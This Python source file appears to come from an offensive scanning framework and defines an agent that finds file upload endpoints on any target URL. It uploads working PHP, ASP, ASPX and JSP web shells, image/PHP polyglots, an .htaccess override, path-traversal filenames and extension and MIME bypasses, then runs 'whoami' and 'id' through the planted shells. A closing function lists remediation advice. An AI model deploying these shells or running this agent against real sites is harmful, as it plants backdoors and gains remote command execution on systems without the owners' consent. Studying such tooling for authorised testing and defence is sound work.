"""
File Upload Security Agent for Nexus Hunter
Comprehensive file upload vulnerability assessment and exploitation
"""

import asyncio
import base64
import hashlib
import mimetypes
import os
import tempfile
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass

import httpx
from loguru import logger

from agents.base import BaseAgent


@dataclass
class FileUploadPayload:
    """File upload test payload"""
    name: str
    filename: str
    content: bytes
    content_type: str
    description: str
    vulnerability_type: str
    severity: str
    detection_method: str


class FileUploadAgent(BaseAgent):
    """Advanced file upload vulnerability detection agent"""
    
    def __init__(self):
        super().__init__("FileUploadAgent")
        self.upload_payloads = self._initialize_upload_payloads()
        self.discovered_vulnerabilities: List[Dict[str, Any]] = []
        self.tested_endpoints: Set[str] = set()
        
        # Safety constraints
        self.max_files_per_endpoint = 10
        self.request_delay = 2.0
        self.max_concurrent_tests = 2
        self.max_file_size = 1024 * 1024  # 1MB max
        
        # File upload indicators
        self.upload_indicators = [
            "upload", "file", "attachment", "document", "image", "photo",
            "avatar", "profile", "media", "content", "data", "import"
        ]
        
        # Dangerous file extensions
        self.dangerous_extensions = [
            ".php", ".php3", ".php4", ".php5", ".phtml", ".phps",
            ".asp", ".aspx", ".jsp", ".jspx", ".war",
            ".sh", ".bash", ".bat", ".cmd", ".ps1",
            ".py", ".pl", ".rb", ".exe", ".dll", ".so",
            ".jar", ".class", ".htaccess", ".config"
        ]
        
        # Bypass techniques
        self.extension_bypasses = [
            # Double extension
            ".jpg.php", ".png.php", ".pdf.asp",
            # Null byte
            ".php%00.jpg", ".asp%00.png",
            # Case variations
            ".PHP", ".AsP", ".JsP",
            # Alternative extensions
            ".php3", ".php4", ".php5", ".phtml", ".pht",
            ".asp", ".aspx", ".cer", ".asa",
            # Special characters
            ".php.", ".php ", ".php::$data"
        ]
    
    def _initialize_upload_payloads(self) -> Dict[str, List[FileUploadPayload]]:
        """Initialize file upload test payloads"""
        return {
            "php_webshells": [
                FileUploadPayload(
                    name="PHP Info Test",
                    filename="test.php",
                    content=b"<?php phpinfo(); ?>",
                    content_type="application/x-php",
                    description="Basic PHP info disclosure",
                    vulnerability_type="PHP Code Execution",
                    severity="high",
                    detection_method="phpinfo_output"
                ),
                FileUploadPayload(
                    name="PHP Command Shell",
                    filename="shell.php",
                    content=b"<?php if(isset($_GET['cmd'])){ echo shell_exec($_GET['cmd']); } ?>",
                    content_type="application/x-php",
                    description="PHP web shell for command execution",
                    vulnerability_type="PHP Remote Code Execution",
                    severity="critical",
                    detection_method="command_execution"
                ),
                FileUploadPayload(
                    name="PHP Minimal Shell",
                    filename="mini.php",
                    content=b"<?php system($_GET['c']); ?>",
                    content_type="text/plain",
                    description="Minimal PHP shell",
                    vulnerability_type="PHP Code Execution",
                    severity="critical",
                    detection_method="command_execution"
                )
            ],
            "asp_webshells": [
                FileUploadPayload(
                    name="ASP Command Shell",
                    filename="shell.asp",
                    content=b"<%eval request(\"c\")%>",
                    content_type="text/plain",
                    description="ASP web shell for command execution", 
                    vulnerability_type="ASP Code Execution",
                    severity="critical",
                    detection_method="command_execution"
                ),
                FileUploadPayload(
                    name="ASPX Web Shell",
                    filename="shell.aspx",
                    content=b'<%@ Page Language="C#" %><script runat="server">void Page_Load(object sender, EventArgs e){if (Request["cmd"] != null) Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]).StandardOutput.ReadToEnd());}</script>',
                    content_type="text/plain",
                    description="ASPX web shell",
                    vulnerability_type="ASPX Code Execution",
                    severity="critical",
                    detection_method="command_execution"
                )
            ],
            "jsp_webshells": [
                FileUploadPayload(
                    name="JSP Command Shell",
                    filename="shell.jsp",
                    content=b"<%@ page import=\"java.util.*,java.io.*\"%><%if (request.getParameter(\"cmd\") != null) {Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}}%>",
                    content_type="text/plain",
                    description="JSP web shell for Java applications",
                    vulnerability_type="JSP Code Execution",
                    severity="critical",
                    detection_method="command_execution"
                )
            ],
            "polyglot_files": [
                FileUploadPayload(
                    name="PHP/JPG Polyglot",
                    filename="image.jpg",
                    content=b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xFF\xFE\x00\x13Created with GIMP\xFF\xDB\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0C\x14\r\x0C\x0B\x0B\x0C\x19\x12\x13\x0F\x14\x1D\x1A\x1F\x1E\x1D\x1A\x1C\x1C $.' \",#\x1C\x1C(7),01444\x1F'9=82<.342\xFF\xC0\x00\x11\x08\x00\x01\x00\x01\x01\x01\x11\x00\x02\x11\x01\x03\x11\x01\xFF\xC4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00\xAA\xFF\xD9<?php phpinfo(); ?>",
                    content_type="image/jpeg",
                    description="JPEG/PHP polyglot file",
                    vulnerability_type="Polyglot Code Execution",
                    severity="high",
                    detection_method="phpinfo_output"
                ),
                FileUploadPayload(
                    name="GIF/PHP Polyglot",
                    filename="image.gif",
                    content=b"GIF87a\x01\x00\x01\x00\x00\x00\x00\x21\xF9\x04\x01\x00\x00\x00\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00\x3B<?php system($_GET['cmd']); ?>",
                    content_type="image/gif",
                    description="GIF/PHP polyglot file",
                    vulnerability_type="Polyglot Code Execution",
                    severity="critical",
                    detection_method="command_execution"
                )
            ],
            "path_traversal": [
                FileUploadPayload(
                    name="Path Traversal Test",
                    filename="../../../test.txt",
                    content=b"Path traversal test file",
                    content_type="text/plain",
                    description="Path traversal via filename",
                    vulnerability_type="Path Traversal",
                    severity="medium",
                    detection_method="file_location"
                ),
                FileUploadPayload(
                    name="Windows Path Traversal",
                    filename="..\\..\\..\\test.txt",
                    content=b"Windows path traversal test",
                    content_type="text/plain",
                    description="Windows path traversal",
                    vulnerability_type="Path Traversal",
                    severity="medium",
                    detection_method="file_location"
                )
            ],
            "content_type_bypass": [
                FileUploadPayload(
                    name="PHP with Image MIME",
                    filename="shell.php",
                    content=b"<?php phpinfo(); ?>",
                    content_type="image/jpeg",
                    description="PHP file with image MIME type",
                    vulnerability_type="Content Type Bypass",
                    severity="high",
                    detection_method="phpinfo_output"
                ),
                FileUploadPayload(
                    name="Script with Text MIME",
                    filename="shell.php",
                    content=b"<?php system($_GET['cmd']); ?>",
                    content_type="text/plain",
                    description="Script with text MIME type",
                    vulnerability_type="Content Type Bypass",
                    severity="critical",
                    detection_method="command_execution"
                )
            ],
            "htaccess_bypass": [
                FileUploadPayload(
                    name="HTAccess Override",
                    filename=".htaccess",
                    content=b"AddType application/x-httpd-php .txt\nAddType application/x-httpd-php .jpg",
                    content_type="text/plain",
                    description="HTAccess file to execute PHP in other extensions",
                    vulnerability_type="Configuration Override",
                    severity="high",
                    detection_method="configuration_change"
                )
            ],
            "zip_bombs": [
                FileUploadPayload(
                    name="Zip Bomb Test",
                    filename="bomb.zip",
                    content=self._create_simple_zip_bomb(),
                    content_type="application/zip",
                    description="Simple zip bomb for DoS testing",
                    vulnerability_type="Denial of Service",
                    severity="medium",
                    detection_method="resource_exhaustion"
                )
            ]
        }
    
    def _create_simple_zip_bomb(self) -> bytes:
        """Create a simple zip bomb for testing"""
        try:
            import zipfile
            import io
            
            # Create a zip file in memory
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                # Add a highly compressible file
                data = b'0' * 10000  # 10KB of zeros (highly compressible)
                zip_file.writestr('test.txt', data)
            
            return zip_buffer.getvalue()
        
        except Exception:
            # Fallback: return a small zip-like header
            return b"PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00test.txtPK\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00test.txtPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00.\x00\x00\x00\x16\x00\x00\x00\x00\x00"
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute file_upload_agent with the given configuration"""
        config = config or {}
        return await self.scan(target, **config)
    
    async def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Perform comprehensive file upload vulnerability assessment
        
        Args:
            target: Target URL to test for file upload vulnerabilities
            **kwargs: Additional scan options
        """
        try:
            # Normalize target URL to include protocol
            if not target.startswith(('http://', 'https://')):
                target = f"http://{target}"
                
            results = {
                "target": target,
                "upload_endpoints": [],
                "vulnerabilities": [],
                "tested_uploads": [],
                "bypass_techniques": [],
                "statistics": {}
            }
            
            self.logger.info(f"Starting file upload security scan for {target}")
            
            # Phase 1: Discover file upload endpoints
            upload_endpoints = await self._discover_upload_endpoints(target)
            results["upload_endpoints"] = upload_endpoints
            
            if not upload_endpoints:
                self.logger.warning("No file upload endpoints found")
                return results
            
            # Phase 2: Test each upload endpoint
            for endpoint in upload_endpoints:
                endpoint_vulns = await self._test_upload_endpoint(endpoint, **kwargs)
                results["vulnerabilities"].extend(endpoint_vulns)
                results["tested_uploads"].append(endpoint)
            
            # Phase 3: Test bypass techniques
            bypass_results = await self._test_bypass_techniques(upload_endpoints, **kwargs)
            results["bypass_techniques"] = bypass_results
            results["vulnerabilities"].extend(bypass_results)
            
            # Analyze results
            results = await self._analyze_upload_results(results)
            
            self.logger.info(f"File upload security scan completed for {target}")
            return results
            
        except Exception as e:
            self.logger.error(f"File upload security scan failed: {e}")
            return {"error": str(e), "target": target}
    
    async def _discover_upload_endpoints(self, target: str) -> List[Dict[str, Any]]:
        """Discover file upload endpoints"""
        endpoints = []
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Get main page to find upload forms
                response = await client.get(target)
                
                # Parse HTML for upload forms
                upload_forms = self._find_upload_forms(response.text, target)
                endpoints.extend(upload_forms)
                
                # Test common upload endpoints
                common_upload_paths = [
                    "/upload", "/file-upload", "/fileupload", "/files/upload",
                    "/api/upload", "/api/file", "/api/files", "/admin/upload",
                    "/user/upload", "/profile/upload", "/media/upload",
                    "/content/upload", "/document/upload", "/image/upload"
                ]
                
                base_url = target.rstrip('/')
                
                for path in common_upload_paths:
                    test_url = f"{base_url}{path}"
                    
                    try:
                        # Test GET request
                        response = await client.get(test_url)
                        if response.status_code not in [404, 405]:
                            # Check if response contains upload-related content
                            if self._has_upload_indicators(response.text):
                                endpoints.append({
                                    "url": test_url,
                                    "method": "GET",
                                    "type": "upload_page",
                                    "discovery_method": "path_enumeration"
                                })
                        
                        # Test POST request (might be upload API)
                        test_files = {"file": ("test.txt", b"test", "text/plain")}
                        response = await client.post(test_url, files=test_files)
                        if response.status_code not in [404, 405, 500]:
                            endpoints.append({
                                "url": test_url,
                                "method": "POST",
                                "type": "upload_api",
                                "discovery_method": "api_test",
                                "response_code": response.status_code
                            })
                    
                    except Exception as e:
                        self.logger.debug(f"Upload endpoint test failed for {test_url}: {e}")
        
        except Exception as e:
            self.logger.error(f"Upload endpoint discovery failed: {e}")
        
        return endpoints
    
    def _find_upload_forms(self, html_content: str, base_url: str) -> List[Dict[str, Any]]:
        """Find file upload forms in HTML content"""
        forms = []
        
        try:
            # Look for file input fields
            file_input_pattern = r'<input[^>]*type=["\']?file["\']?[^>]*>'
            form_pattern = r'<form[^>]*>.*?</form>'
            
            import re
            
            # Find all forms
            form_matches = re.findall(form_pattern, html_content, re.IGNORECASE | re.DOTALL)
            
            for form_html in form_matches:
                if re.search(file_input_pattern, form_html, re.IGNORECASE):
                    # Extract form action and method
                    action_match = re.search(r'action=["\']?([^"\'>\s]+)', form_html, re.IGNORECASE)
                    method_match = re.search(r'method=["\']?([^"\'>\s]+)', form_html, re.IGNORECASE)
                    
                    action = action_match.group(1) if action_match else ""
                    method = method_match.group(1) if method_match else "POST"
                    
                    # Construct full URL
                    if action.startswith('http'):
                        form_url = action
                    elif action.startswith('/'):
                        parsed_base = httpx.URL(base_url)
                        form_url = f"{parsed_base.scheme}://{parsed_base.host}{action}"
                    else:
                        form_url = f"{base_url.rstrip('/')}/{action}" if action else base_url
                    
                    forms.append({
                        "url": form_url,
                        "method": method.upper(),
                        "type": "upload_form",
                        "discovery_method": "html_form_parsing",
                        "form_html": form_html[:200]  # First 200 chars for reference
                    })
        
        except Exception as e:
            self.logger.debug(f"Upload form parsing failed: {e}")
        
        return forms
    
    def _has_upload_indicators(self, content: str) -> bool:
        """Check if content has file upload indicators"""
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in self.upload_indicators)
    
    async def _test_upload_endpoint(self, endpoint: Dict[str, Any], **kwargs) -> List[Dict[str, Any]]:
        """Test a specific upload endpoint for vulnerabilities"""
        vulnerabilities = []
        
        try:
            url = endpoint["url"]
            method = endpoint.get("method", "POST")
            
            if method.upper() != "POST":
                return vulnerabilities  # Only test POST endpoints for uploads
            
            async with httpx.AsyncClient(timeout=20, verify=False) as client:
                # Test different payload categories
                for category, payloads in self.upload_payloads.items():
                    # Skip zip bombs unless specifically requested
                    if category == "zip_bombs" and not kwargs.get("test_zip_bombs", False):
                        continue
                    
                    for payload in payloads[:2]:  # Limit payloads per category
                        vuln = await self._test_single_upload_payload(client, url, payload, **kwargs)
                        if vuln:
                            vulnerabilities.append(vuln)
                        
                        await asyncio.sleep(self.request_delay)
        
        except Exception as e:
            self.logger.error(f"Upload endpoint testing failed: {e}")
        
        return vulnerabilities
    
    async def _test_single_upload_payload(self, client: httpx.AsyncClient, url: str, 
                                        payload: FileUploadPayload, **kwargs) -> Optional[Dict[str, Any]]:
        """Test a single file upload payload"""
        try:
            # Prepare file upload
            files = {
                "file": (payload.filename, payload.content, payload.content_type)
            }
            
            # Additional form data that might be required
            data = {
                "submit": "Upload",
                "action": "upload",
                "type": "file"
            }
            
            # Upload the file
            response = await client.post(url, files=files, data=data)
            
            # Analyze response for vulnerability indicators
            is_vulnerable, evidence, uploaded_url = await self._analyze_upload_response(
                response, payload, url, client
            )
            
            if is_vulnerable:
                return {
                    "endpoint": url,
                    "filename": payload.filename,
                    "payload_name": payload.name,
                    "vulnerability_type": payload.vulnerability_type,
                    "severity": payload.severity,
                    "description": payload.description,
                    "evidence": evidence,
                    "uploaded_url": uploaded_url,
                    "detection_method": payload.detection_method,
                    "status_code": response.status_code,
                    "content_type_sent": payload.content_type
                }
        
        except Exception as e:
            self.logger.debug(f"Upload payload test failed: {e}")
        
        return None
    
    async def _analyze_upload_response(self, response: httpx.Response, payload: FileUploadPayload, 
                                     upload_url: str, client: httpx.AsyncClient) -> Tuple[bool, str, Optional[str]]:
        """Analyze upload response for vulnerability indicators"""
        try:
            response_text = response.text
            evidence_indicators = []
            uploaded_url = None
            
            # Check if upload was successful
            success_indicators = [
                "success", "uploaded", "complete", "saved", "file received",
                "upload successful", "file saved", "thank you"
            ]
            
            upload_successful = (
                response.status_code in [200, 201, 302] or
                any(indicator in response_text.lower() for indicator in success_indicators)
            )
            
            if not upload_successful:
                return False, "Upload failed or rejected", None
            
            # Try to find uploaded file URL
            uploaded_url = self._extract_uploaded_file_url(response_text, upload_url, payload.filename)
            
            # Detection method specific analysis
            if payload.detection_method == "phpinfo_output":
                # Try to access uploaded file and check for PHP execution
                if uploaded_url:
                    try:
                        file_response = await client.get(uploaded_url)
                        if "php version" in file_response.text.lower() or "phpinfo()" in file_response.text.lower():
                            evidence_indicators.append("PHP code executed - phpinfo() output detected")
                    except:
                        pass
            
            elif payload.detection_method == "command_execution":
                # Try to execute commands through uploaded shell
                if uploaded_url:
                    try:
                        # Test command execution
                        cmd_url = f"{uploaded_url}?cmd=whoami"
                        cmd_response = await client.get(cmd_url)
                        if len(cmd_response.text.strip()) > 0 and cmd_response.status_code == 200:
                            evidence_indicators.append(f"Command execution successful: {cmd_response.text[:100]}")
                        
                        # Alternative parameter names
                        for param in ["c", "command", "exec"]:
                            alt_url = f"{uploaded_url}?{param}=id"
                            alt_response = await client.get(alt_url)
                            if "uid=" in alt_response.text or "gid=" in alt_response.text:
                                evidence_indicators.append(f"Command execution via {param} parameter")
                    except:
                        pass
            
            elif payload.detection_method == "file_location":
                # Check if file was uploaded to unexpected location (path traversal)
                if payload.filename.startswith("../") and uploaded_url:
                    if "../" in uploaded_url or payload.filename in uploaded_url:
                        evidence_indicators.append("Path traversal successful - file uploaded to unexpected location")
            
            elif payload.detection_method == "configuration_change":
                # Check if configuration file (.htaccess) was uploaded
                if payload.filename == ".htaccess":
                    evidence_indicators.append("Configuration file uploaded - potential server configuration override")
                    
                    # Try to upload a test PHP file as .txt and see if it executes
                    try:
                        test_files = {"file": ("test.txt", b"<?php echo 'HTACCESS_TEST'; ?>", "text/plain")}
                        test_response = await client.post(upload_url, files=test_files)
                        
                        if "success" in test_response.text.lower():
                            # Try to access the .txt file
                            base_url = upload_url.rsplit('/', 1)[0]
                            txt_url = f"{base_url}/test.txt"
                            exec_response = await client.get(txt_url)
                            if "HTACCESS_TEST" in exec_response.text:
                                evidence_indicators.append("HTAccess override successful - PHP execution in .txt files")
                    except:
                        pass
            
            elif payload.detection_method == "resource_exhaustion":
                # Check for DoS indicators (long response time, server errors)
                if response.status_code >= 500:
                    evidence_indicators.append("Server error - possible resource exhaustion")
            
            # General indicators
            if uploaded_url:
                evidence_indicators.append(f"File uploaded and accessible at: {uploaded_url}")
            
            # Check response for error messages that might indicate filtering bypass
            bypass_indicators = [
                "file type not allowed", "extension not permitted", "invalid file type",
                "security check failed", "malicious file detected"
            ]
            
            if not any(indicator in response_text.lower() for indicator in bypass_indicators):
                evidence_indicators.append("No file type restrictions detected")
            
            return len(evidence_indicators) > 0, "; ".join(evidence_indicators), uploaded_url
        
        except Exception as e:
            self.logger.debug(f"Upload response analysis failed: {e}")
            return False, "", None
    
    def _extract_uploaded_file_url(self, response_text: str, upload_url: str, filename: str) -> Optional[str]:
        """Extract uploaded file URL from response"""
        try:
            import re
            from urllib.parse import urljoin, urlparse
            
            # Look for URL patterns in response
            url_patterns = [
                rf'(https?://[^\s"\'<>]+{re.escape(filename)})',  # Full URL
                rf'(/[^\s"\'<>]*{re.escape(filename)})',  # Relative path
                rf'(uploads?/[^\s"\'<>]*{re.escape(filename)})',  # Upload directory
                rf'(files?/[^\s"\'<>]*{re.escape(filename)})',  # Files directory
            ]
            
            base_url = upload_url.rsplit('/', 1)[0]
            
            for pattern in url_patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                for match in matches:
                    if match.startswith('http'):
                        return match
                    else:
                        return urljoin(base_url, match.lstrip('/'))
            
            # Try common upload directories
            common_dirs = ["uploads", "files", "media", "content", "documents", "images"]
            parsed_url = urlparse(upload_url)
            
            for directory in common_dirs:
                potential_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{directory}/{filename}"
                return potential_url
            
        except Exception as e:
            self.logger.debug(f"URL extraction failed: {e}")
        
        return None
    
    async def _test_bypass_techniques(self, endpoints: List[Dict[str, Any]], **kwargs) -> List[Dict[str, Any]]:
        """Test various file upload bypass techniques"""
        bypass_results = []
        
        try:
            # Test extension bypasses
            for endpoint in endpoints[:3]:  # Limit endpoints tested
                if endpoint.get("method", "").upper() != "POST":
                    continue
                
                url = endpoint["url"]
                
                async with httpx.AsyncClient(timeout=15, verify=False) as client:
                    # Test various bypass techniques
                    for bypass_ext in self.extension_bypasses[:5]:  # Limit bypasses tested
                        try:
                            # Create test payload with bypass extension
                            bypass_filename = f"test{bypass_ext}"
                            test_content = b"<?php echo 'BYPASS_SUCCESS'; ?>"
                            
                            files = {"file": (bypass_filename, test_content, "text/plain")}
                            data = {"submit": "Upload"}
                            
                            response = await client.post(url, files=files, data=data)
                            
                            # Check if bypass was successful
                            if response.status_code in [200, 201] and "success" in response.text.lower():
                                bypass_results.append({
                                    "endpoint": url,
                                    "bypass_technique": "Extension Bypass",
                                    "filename": bypass_filename,
                                    "severity": "high",
                                    "description": f"File upload bypass using extension: {bypass_ext}",
                                    "evidence": f"File {bypass_filename} uploaded successfully",
                                    "vulnerability_type": "Upload Filter Bypass"
                                })
                            
                            await asyncio.sleep(1)  # Avoid overwhelming server
                        
                        except Exception as e:
                            self.logger.debug(f"Bypass test failed: {e}")
                    
                    # Test MIME type bypass
                    mime_bypasses = [
                        ("shell.php", "image/jpeg"),
                        ("shell.asp", "image/png"),
                        ("shell.jsp", "text/plain")
                    ]
                    
                    for filename, fake_mime in mime_bypasses:
                        try:
                            files = {"file": (filename, b"<?php phpinfo(); ?>", fake_mime)}
                            response = await client.post(url, files=files)
                            
                            if response.status_code in [200, 201] and "success" in response.text.lower():
                                bypass_results.append({
                                    "endpoint": url,
                                    "bypass_technique": "MIME Type Bypass",
                                    "filename": filename,
                                    "fake_mime_type": fake_mime,
                                    "severity": "high",
                                    "description": f"MIME type bypass: {filename} uploaded as {fake_mime}",
                                    "evidence": f"Executable file uploaded with fake MIME type",
                                    "vulnerability_type": "MIME Type Filter Bypass"
                                })
                        
                        except Exception as e:
                            self.logger.debug(f"MIME bypass test failed: {e}")
        
        except Exception as e:
            self.logger.error(f"Bypass technique testing failed: {e}")
        
        return bypass_results
    
    async def _analyze_upload_results(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze and categorize file upload results"""
        try:
            all_vulnerabilities = results["vulnerabilities"] + results["bypass_techniques"]
            
            # Categorize by severity
            critical_vulns = [v for v in all_vulnerabilities if v.get("severity") == "critical"]
            high_vulns = [v for v in all_vulnerabilities if v.get("severity") == "high"]
            medium_vulns = [v for v in all_vulnerabilities if v.get("severity") == "medium"]
            low_vulns = [v for v in all_vulnerabilities if v.get("severity") == "low"]
            
            # Categorize by vulnerability type
            code_execution = [v for v in all_vulnerabilities if "Code Execution" in v.get("vulnerability_type", "")]
            path_traversal = [v for v in all_vulnerabilities if "Path Traversal" in v.get("vulnerability_type", "")]
            filter_bypass = [v for v in all_vulnerabilities if "Bypass" in v.get("vulnerability_type", "")]
            dos_attacks = [v for v in all_vulnerabilities if "Denial of Service" in v.get("vulnerability_type", "")]
            
            results["categorized_vulnerabilities"] = {
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns
            }
            
            results["vulnerability_types"] = {
                "code_execution": code_execution,
                "path_traversal": path_traversal,
                "filter_bypass": filter_bypass,
                "dos_attacks": dos_attacks
            }
            
            # Calculate risk score
            risk_score = (
                len(critical_vulns) * 4 +
                len(high_vulns) * 3 +
                len(medium_vulns) * 2 +
                len(low_vulns) * 1
            )
            
            results["statistics"] = {
                "total_vulnerabilities": len(all_vulnerabilities),
                "critical_count": len(critical_vulns),
                "high_count": len(high_vulns),
                "medium_count": len(medium_vulns),
                "low_count": len(low_vulns),
                "upload_endpoints_found": len(results["upload_endpoints"]),
                "code_execution_count": len(code_execution),
                "bypass_techniques_successful": len(filter_bypass),
                "risk_score": risk_score,
                "risk_level": self._calculate_risk_level(risk_score)
            }
            
            results["recommendations"] = self._generate_upload_recommendations(results)
            
            return results
        
        except Exception as e:
            self.logger.error(f"Upload results analysis failed: {e}")
            return results
    
    def _calculate_risk_level(self, risk_score: int) -> str:
        """Calculate risk level based on score"""
        if risk_score >= 15:
            return "CRITICAL"
        elif risk_score >= 10:
            return "HIGH"
        elif risk_score >= 5:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _generate_upload_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate file upload specific security recommendations"""
        recommendations = []
        
        if results["statistics"]["total_vulnerabilities"] > 0:
            recommendations.extend([
                "CRITICAL: Implement strict file type validation using allowlists",
                "Validate file content, not just extensions or MIME types", 
                "Store uploaded files outside web root directory",
                "Use antivirus scanning for uploaded files",
                "Implement file size limits and rate limiting",
                "Generate random filenames to prevent direct access"
            ])
        
        # Type-specific recommendations
        vuln_types = results.get("vulnerability_types", {})
        
        if vuln_types.get("code_execution"):
            recommendations.extend([
                "CRITICAL: Never execute uploaded files directly",
                "Disable script execution in upload directories",
                "Use sandboxed environments for file processing",
                "Implement content scanning for malicious code"
            ])
        
        if vuln_types.get("filter_bypass"):
            recommendations.extend([
                "Implement multiple validation layers (extension, MIME, content)",
                "Use file signature validation (magic bytes)",
                "Reject double extensions and suspicious filenames",
                "Validate against known bypass techniques"
            ])
        
        if vuln_types.get("path_traversal"):
            recommendations.extend([
                "Sanitize filenames and remove directory traversal sequences",
                "Use absolute paths and validate file destinations",
                "Implement chroot jails or containerization"
            ])
        
        recommendations.extend([
            "Implement comprehensive logging of upload activities",
            "Use Content Security Policy (CSP) headers",
            "Regular security testing of upload functionality",
            "Monitor for unusual upload patterns",
            "Implement proper error handling without information disclosure"
        ])
        
        return recommendations
    
    def get_vulnerability_types(self) -> List[str]:
        """Get types of file upload vulnerabilities this agent can detect"""
        return [
            "PHP Code Execution",
            "ASP Code Execution", 
            "JSP Code Execution",
            "Polyglot Code Execution",
            "Path Traversal",
            "Content Type Bypass",
            "Extension Filter Bypass",
            "MIME Type Filter Bypass",
            "Configuration Override",
            "Denial of Service",
            "Arbitrary File Upload"
        ]
    
    def get_description(self) -> str:
        """Get agent description"""
        return "Comprehensive file upload vulnerability detection agent testing for code execution, path traversal, filter bypasses, and malicious file upload scenarios"

